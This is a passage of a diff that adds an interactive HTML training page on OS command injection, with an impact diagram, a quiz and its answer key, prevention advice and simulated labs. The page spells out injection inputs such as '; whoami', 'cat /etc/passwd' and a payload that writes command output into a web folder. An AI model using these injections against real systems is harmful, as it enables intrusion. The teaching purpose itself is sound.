+                                        <td>Whitelist validation + input checking</td>
+                                        <td>❌ Hard - Properly secured</td>
+                                        <td>Protected</td>
+                                    </tr>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🎓 Impact Chain</div>
+                        <div class="section-content">
+                            <div class="flow-diagram">
+                                <div class="flow-box" style="background: rgba(255, 51, 102, 0.2); border-color: var(--danger);">Injection</div>
+                                <div class="flow-arrow" style="color: var(--danger);">→</div>
+                                <div class="flow-box" style="background: rgba(255, 51, 102, 0.2); border-color: var(--danger);">RCE</div>
+                                <div class="flow-arrow" style="color: var(--danger);">→</div>
+                                <div class="flow-box" style="background: rgba(255, 51, 102, 0.2); border-color: var(--danger);">Rev Shell</div>
+                                <div class="flow-arrow" style="color: var(--danger);">→</div>
+                                <div class="flow-box" style="background: rgba(255, 51, 102, 0.2); border-color: var(--danger);">Full Control</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-danger">
+                        <div class="alert-icon">!</div>
+                        <div>
+                            <strong>Complete Compromise:</strong> From a simple command injection, an attacker achieved:<br>
+                            • Remote Code Execution<br>
+                            • Interactive shell access<br>
+                            • Server user identification<br>
+                            • File system access<br>
+                            • Potential lateral movement to other systems
+                        </div>
+                    </div>
+                </div>
+
+                <!-- QUIZ -->
+                <div class="module">
+                    <h1 class="module-title">❓ Final Quiz & Summary</h1>
+                    <p class="module-subtitle">Test your understanding of OS Command Injection</p>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">📝 Knowledge Check</div>
+                        <div class="section-content">
+                            <div class="quiz-container">
+                                <!-- Q1 -->
+                                <div class="quiz-question">
+                                    <div class="quiz-question-text">Q1: What does the semicolon (;) do in shell commands?</div>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q1" value="a" onchange="checkQuiz('q1', 'a')">
+                                        <span>A) Encrypts the command</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q1" value="b" onchange="checkQuiz('q1', 'b')">
+                                        <span>B) Ends one command and allows another to execute</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q1" value="c" onchange="checkQuiz('q1', 'c')">
+                                        <span>C) Adds a comment to the command</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q1" value="d" onchange="checkQuiz('q1', 'd')">
+                                        <span>D) Requires administrator privileges</span>
+                                    </label>
+                                    <div class="quiz-feedback" id="feedback-q1" style="display: none;"></div>
+                                </div>
+
+                                <!-- Q2 -->
+                                <div class="quiz-question">
+                                    <div class="quiz-question-text">Q2: What is blind command injection?</div>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q2" value="a" onchange="checkQuiz('q2', 'a')">
+                                        <span>A) Commands that don't execute</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q2" value="b" onchange="checkQuiz('q2', 'b')">
+                                        <span>B) Commands execute but output isn't returned to attacker</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q2" value="c" onchange="checkQuiz('q2', 'c')">
+                                        <span>C) Injection that requires authorization</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q2" value="d" onchange="checkQuiz('q2', 'd')">
+                                        <span>D) Injection that only affects Windows servers</span>
+                                    </label>
+                                    <div class="quiz-feedback" id="feedback-q2" style="display: none;"></div>
+                                </div>
+
+                                <!-- Q3 -->
+                                <div class="quiz-question">
+                                    <div class="quiz-question-text">Q3: What is a reverse shell?</div>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q3" value="a" onchange="checkQuiz('q3', 'a')">
+                                        <span>A) A shell that runs in backwards compatibility mode</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q3" value="b" onchange="checkQuiz('q3', 'b')">
+                                        <span>B) The victim server connects back to the attacker's machine</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q3" value="c" onchange="checkQuiz('q3', 'c')">
+                                        <span>C) A shell that only accepts reverse engineering commands</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q3" value="d" onchange="checkQuiz('q3', 'd')">
+                                        <span>D) A shell that cannot be exploited</span>
+                                    </label>
+                                    <div class="quiz-feedback" id="feedback-q3" style="display: none;"></div>
+                                </div>
+
+                                <!-- Q4 -->
+                                <div class="quiz-question">
+                                    <div class="quiz-question-text">Q4: Which is the SAFE way to handle user input in OS commands?</div>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q4" value="a" onchange="checkQuiz('q4', 'a')">
+                                        <span>A) Concatenate user input directly into the command string</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q4" value="b" onchange="checkQuiz('q4', 'b')">
+                                        <span>B) Escape shell arguments or use parameterized commands</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q4" value="c" onchange="checkQuiz('q4', 'c')">
+                                        <span>C) Run all commands with administrator privileges</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q4" value="d" onchange="checkQuiz('q4', 'd')">
+                                        <span>D) Assume users will never input special characters</span>
+                                    </label>
+                                    <div class="quiz-feedback" id="feedback-q4" style="display: none;"></div>
+                                </div>
+
+                                <!-- Q5 -->
+                                <div class="quiz-question">
+                                    <div class="quiz-question-text">Q5: What does the && operator do in shell commands?</div>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q5" value="a" onchange="checkQuiz('q5', 'a')">
+                                        <span>A) Ends the command unconditionally</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q5" value="b" onchange="checkQuiz('q5', 'b')">
+                                        <span>B) Executes next command only if the previous one succeeds</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q5" value="c" onchange="checkQuiz('q5', 'c')">
+                                        <span>C) Cancels the current command</span>
+                                    </label>
+                                    <label class="quiz-option">
+                                        <input type="radio" name="q5" value="d" onchange="checkQuiz('q5', 'd')">
+                                        <span>D) Requires double authentication</span>
+                                    </label>
+                                    <div class="quiz-feedback" id="feedback-q5" style="display: none;"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">📚 Key Takeaways</div>
+                        <div class="section-content">
+                            <div class="subsection">
+                                <div class="subsection-title">🎯 What You've Learned:</div>
+                                <p>✓ OS Command Injection is a critical vulnerability (CVSS 9-10)</p>
+                                <p>✓ It occurs when user input reaches OS commands without validation</p>
+                                <p>✓ Command separators (;, &&, |, etc.) enable multi-command execution</p>
+                                <p>✓ Visible AND blind injection can lead to complete system compromise</p>
+                                <p>✓ Reverse shells grant interactive access to compromised servers</p>
+                                <p>✓ Proper input validation and escaped arguments prevent exploitation</p>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">🛡️ How to Prevent It:</div>
+                                <p>✓ Escape shell arguments (escapeshellarg in PHP)</p>
+                                <p>✓ Use argument arrays instead of string concatenation</p>
+                                <p>✓ Validate input with whitelist (regex patterns)</p>
+                                <p>✓ Run applications with least privilege (non-root)</p>
+                                <p>✓ Avoid shell execution when possible (use APIs)</p>
+                                <p>✓ Keep systems patched and updated</p>
+                            </div>
+
+                            <div class="subsection">
+                                <div class="subsection-title">🔍 Real-World Impact:</div>
+                                <p>OS Command Injection has compromised:</p>
+                                <p>• Web hosting companies</p>
+                                <p>• E-commerce platforms</p>
+                                <p>• Government systems</p>
+                                <p>• Fortune 500 companies</p>
+                                <p style="color: var(--danger); margin-top: 10px;"><strong>This is NOT theoretical - it's happening right now.</strong></p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <div class="section-title" onclick="toggleSection(this)">🚀 Next Steps</div>
+                        <div class="section-content">
+                            <div class="subsection">
+                                <div class="subsection-title">Continue Your Learning:</div>
+                                <p>1. Practice on HackTheBox and TryHackMe</p>
+                                <p>2. Set up a local DVWA environment</p>
+                                <p>3. Analyze real vulnerability disclosures (CVE databases)</p>
+                                <p>4. Learn other injection types (SQL, XPath, LDAP)</p>
+                                <p>5. Develop secure coding practices</p>
+                                <p>6. Participate in bug bounty programs</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Module Navigation
+        function showModule(moduleIndex) {
+            const modules = document.querySelectorAll('.module');
+            const navItems = document.querySelectorAll('.nav-item');
+            
+            modules.forEach(m => m.classList.remove('active'));
+            navItems.forEach(n => n.classList.remove('active'));
+            
+            modules[moduleIndex].classList.add('active');
+            navItems[moduleIndex].classList.add('active');
+            
+            document.querySelector('.content').scrollTop = 0;
+        }
+
+        // Toggle Sections
+        function toggleSection(element) {
+            element.closest('.section').classList.toggle('collapsed');
+        }
+
+        // Command Simulator
+        function simulateCommand(inputId, outputId) {
+            const input = document.getElementById(inputId).value.trim();
+            const output = document.getElementById(outputId);
+            const content = document.getElementById(outputId + '-content');
+            
+            if (!input) {
+                alert('Enter a command');
+                return;
+            }
+
+            const commands = {
+                'whoami': 'www-data',
+                'id': 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
+                'pwd': '/var/www/html',
+                'ls': 'index.php  config.php  images/  uploads/',
+                'uname -a': 'Linux webserver 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64 GNU/Linux',
+                'cat /etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin'
+            };
+
+            const result = commands[input] || `Command not found: ${input}`;
+            
+            content.innerHTML = `
+                <div class="terminal-line">
+                    <span class="terminal-prompt">$</span>
+                    <span class="terminal-command">${input}</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="terminal-output">${result}</span>
+                </div>
+            `;
+            
+            output.style.display = 'block';
+        }
+
+        // Input Journey Simulator
+        function simulateInputJourney() {
+            const input = document.getElementById('input-sim').value.trim();
+            if (!input) {
+                alert('Enter an IP address');
+                return;
+            }
+            
+            document.getElementById('journey-input').textContent = input;
+            document.getElementById('journey-param').textContent = input;
+            document.getElementById('journey-var').textContent = input;
+            document.getElementById('journey-construct').textContent = input;
+            document.getElementById('journey-os').textContent = input;
+            document.getElementById('journey-output').style.display = 'block';
+        }
+
+        // Safe/Unsafe Code Test
+        function testSafeUnsafe() {
+            const input = document.getElementById('safety-test').value.trim();
+            if (!input) return;
+
+            const results = document.getElementById('safety-results');
+            
+            const unsafeCmd = `system("ping -c 1 ${input}")`;
+            const safeCmd = `system("ping -c 1 " . escapeshellarg("${input}"))`;
+            
+            let unsafeOutput = `Command executed:\nping -c 1 ${input}`;
+            let safeOutput = `Command executed:\nping -c 1 '${input}'`;
+            
+            if (input.includes(';') || input.includes('&&')) {
+                unsafeOutput += '\n\n⚠️ INJECTION DETECTED - Multiple commands executed!';
+                unsafeOutput += '\nAttacker could execute: ' + input.split(/[;&|]+/)[1];
+            } else {
+                unsafeOutput += '\n\n(Safe input, but principle applies)';
+            }
+            
+            safeOutput += '\n\n✓ Input safely escaped\n✓ Special characters treated as literal strings';
+            
+            document.getElementById('unsafe-output').innerHTML = `<div class="terminal-line"><span class="terminal-prompt">❌</span><span class="terminal-output">${unsafeOutput.replace(/\n/g, '<br>')}</span></div>`;
+            document.getElementById('safe-output').innerHTML = `<div class="terminal-line"><span class="terminal-prompt">✓</span><span class="terminal-output">${safeOutput.replace(/\n/g, '<br>')}</span></div>`;
+            
+            results.style.display = 'block';
+        }
+
+        // Separator Demo
+        function showSeparatorDemo(separator) {
+            const demos = {
+                ';': {
+                    desc: 'Semicolon - Execute commands sequentially',
+                    cmd: 'ping -c 1 8.8.8.8 ; whoami',
+                    result: '<div class="terminal-line"><span class="terminal-prompt">$</span><span class="terminal-command">ping -c 1 8.8.8.8</span></div><div class="terminal-line"><span class="terminal-output">PING 8.8.8.8...</span></div><div class="terminal-line" style="margin-top:10px;"><span class="terminal-prompt">$</span><span class="terminal-command">whoami</span></div><div class="terminal-line"><span class="terminal-success">www-data</span></div>'
+                },
+                '&&': {
+                    desc: 'AND - Execute next only if first succeeds',
+                    cmd: 'ping -c 1 google.com && whoami',
+                    result: '<div class="terminal-line"><span class="terminal-prompt">$</span><span class="terminal-command">ping -c 1 google.com && whoami</span></div><div class="terminal-line"><span class="terminal-output">PING google.com...</span></div><div class="terminal-line"><span class="terminal-output">✓ Success - executing whoami...</span></div><div class="terminal-line"><span class="terminal-success">www-data</span></div>'
+                },
+                '||': {
+                    desc: 'OR - Execute next only if first fails',
+                    cmd: 'false || whoami',
+                    result: '<div class="terminal-line"><span class="terminal-prompt">$</span><span class="terminal-command">false || whoami</span></div><div class="terminal-line"><span class="terminal-output">✗ First command failed - executing whoami...</span></div><div class="terminal-line"><span class="terminal-success">www-data</span></div>'
+                },
+                '|': {
+                    desc: 'Pipe - Send output of first to second',
+                    cmd: 'whoami | cat',
+                    result: '<div class="terminal-line"><span class="terminal-prompt">$</span><span class="terminal-command">whoami | cat</span></div><div class="terminal-line"><span class="terminal-output">Output of whoami piped to cat:</span></div><div class="terminal-line"><span class="terminal-success">www-data</span></div>'
+                },
+                '$()': {
+                    desc: 'Command Substitution - Execute and substitute output',
+                    cmd: 'echo Server user: $(whoami)',
+                    result: '<div class="terminal-line"><span class="terminal-prompt">$</span><span class="terminal-command">echo Server user: $(whoami)</span></div><div class="terminal-line"><span class="terminal-success">Server user: www-data</span></div>'
+                }
+            };
+
+            const demo = demos[separator];
+            const content = document.getElementById('separator-content');
+            
+            content.innerHTML = `
+                <div class="terminal-line"><span class="terminal-prompt">→</span><span class="terminal-output"><strong>${demo.desc}</strong></span></div>
+                <div class="terminal-line" style="margin-top:10px;"><span class="terminal-prompt">$</span><span class="terminal-command">${demo.cmd}</span></div>
+                ${demo.result}
+            `;
+            
+            document.getElementById('separator-demo').style.display = 'block';
+        }
+
+        // Lab 1 Simulator
+        function simulateLab1() {
+            const injection = document.getElementById('lab1-injection').value.trim();
+            const param = injection || '1';
+            
+            document.getElementById('param1-value').textContent = param;
+            
+            let response = '';
+            if (injection.includes('whoami') && (injection.includes(';') || injection.includes('&&'))) {
+                response = `Invalid product<br><br>www-data<br><br>✅ Lab completed! The whoami command was executed.`;
+            } else if (injection === '' || injection === '1') {
+                response = `Stock for product 1: 42 units`;
+            } else {
+                response = `Error: Invalid input`;
+            }
+            
+            document.getElementById('lab1-response').innerHTML = response;
+        }
+
+        function resetLab1() {
+            document.getElementById('lab1-injection').value = '';
+            document.getElementById('param1-value').textContent = '1';
+            document.getElementById('param2-value').textContent = '1';
+            document.getElementById('lab1-response').innerHTML = '<div style="color: var(--text-dim);">Response will appear here...</div>';
+        }
+
+        // Lab 2 Simulator
+        let normalTime = 0;
+        function testNormalRequest() {
+            const results = document.getElementById('lab2-results');
+            normalTime = Math.random() * 200 + 100;
+            document.getElementById('normal-time').textContent = normalTime.toFixed(0) + 'ms';
+            results.style.display = 'block';
+        }
+
+        function testBlindInjection() {
+            const start = performance.now();
+            const results = document.getElementById('lab2-results');
+            
+            setTimeout(() => {
+                const delay = performance.now() - start;
+                const injectionTime = delay.toFixed(0);
+                document.getElementById('injection-time').textContent = injectionTime + 'ms';
+                document.getElementById('injection-status').innerHTML = '<span style="color: var(--success);">Success</span>';
+                
+                const timeDiff = injectionTime - normalTime;
+                if (timeDiff > 5000) {
+                    document.getElementById('injection-analysis').innerHTML = `<span style="color: var(--success);">✓ Sleep 10 detected! Delay: ${(timeDiff/1000).toFixed(1)}s</span>`;
+                } else {
+                    document.getElementById('injection-analysis').innerHTML = `<span style="color: var(--warning);">⚠️ Simulated delay: ${(timeDiff/1000).toFixed(1)}s</span>`;
+                }
+                
+                results.style.display = 'block';
+            }, 10000);
+            
+            document.getElementById('injection-status').innerHTML = '<span style="color: var(--warning);">Executing...</span>';
+            results.style.display = 'block';
+        }
+
+        // Lab 3 Simulator
+        function executeLab3Step1() {
+            const email = document.getElementById('lab3-email').value;
+            if (email.includes('whoami') && email.includes('>')) {
+                document.getElementById('lab3-step1-result').style.display = 'block';
+            } else {
+                alert('Try injecting: test@test.com; whoami > /var/www/html/images/output.txt');
+            }
+        }
+
+        function executeLab3Step2() {
+            document.getElementById('lab3-step2-result').style.display = 'block';
+            document.getElementById('lab3-output').innerHTML = 'www-data';
+        }
+
+        // Burp Suite Tab Switching
+        function switchBurpTab(event, tabId) {
+            const tabs = event.target.parentElement.querySelectorAll('.burp-tab');
+            const contents = event.target.parentElement.parentElement.querySelectorAll('.burp-content');
+            
+            tabs.forEach(t => t.classList.remove('active'));
+            contents.forEach(c => c.classList.remove('active'));
+            
+            event.target.classList.add('active');
+            document.getElementById(tabId).classList.add('active');
+        }
+
+        // Quiz
+        const answers = {
+            'q1': 'b',
+            'q2': 'b',
+            'q3': 'b',
+            'q4': 'b',
+            'q5': 'b'
+        };
+
+        function checkQuiz(questionId, selectedValue) {
+            const feedback = document.getElementById('feedback-' + questionId);
+            const options = document.querySelectorAll(`input[name="${questionId}"]`);
+            const optionElements = document.querySelectorAll(`.quiz-question:has(input[name="${questionId}"])`);
+            
+            const questionDiv = optionElements[0];
+            const allLabels = questionDiv.querySelectorAll('label');
+            
+            const isCorrect = selectedValue === answers[questionId];
+            
+            allLabels.forEach(label => {
+                label.classList.remove('correct', 'incorrect');
+                const radio = label.querySelector('input');
+                if (radio.value === answers[questionId]) {
+                    label.classList.add('correct');
+                } else if (radio.checked && !isCorrect) {
+                    label.classList.add('incorrect');
+                }
+            });
+            
+            feedback.style.display = 'block';
+            feedback.className = 'quiz-feedback ' + (isCorrect ? 'correct' : 'incorrect');
+            feedback.textContent = isCorrect ? '✓ Correct!' : '✗ Incorrect - try again';
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            showModule(0);
+        });
+    </script>
+</body>
+</html>
